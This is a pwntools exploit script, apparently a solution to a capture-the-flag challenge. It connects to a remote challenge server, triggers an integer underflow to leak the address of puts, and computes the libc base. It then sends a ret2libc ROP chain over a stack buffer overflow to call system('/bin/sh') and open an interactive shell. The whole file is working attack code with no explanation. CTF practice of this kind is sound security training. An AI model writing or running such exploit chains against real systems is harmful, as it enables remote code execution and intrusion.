from pwn import *
libc = ELF('./libc.so.6')
r = remote('chal.pctf.competitivecyber.club', 4444)
# get $4294966991 with underflow -> puts leak 
r.sendline(b'2')
r.sendline(b'2')
r.sendline(b'y')
for _ in range(7):
    r.sendline(b'2')
    r.sendline(b'2')
    r.sendline(b'y')
r.sendline(b'2')
r.sendline(b'3')
r.recvuntil(b'glory ')
r.sendline()
puts_addr = int(r.recvuntil(b' '), 16)
print(f'puts_addr = {hex(puts_addr)}')
libc.address = puts_addr - libc.sym['puts']
print(f'libc.address = {hex(libc.address)}')
# audiobook + 40 char book -> admin access
r.sendline(b'1')
r.sendline(b'y')
r.sendline(b'a'*40)

# rop (ret2libc)
ret_gadget = 0x000000000040101a
# we can use gadgets from libc 
pop_rdi_gadget = libc.address + 0x000000000002a3e5 
r.sendline(b'3')
r.sendline(b'a' * (0x30 + 8) + p64(ret_gadget) + p64(pop_rdi_gadget) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']))
r.interactive()




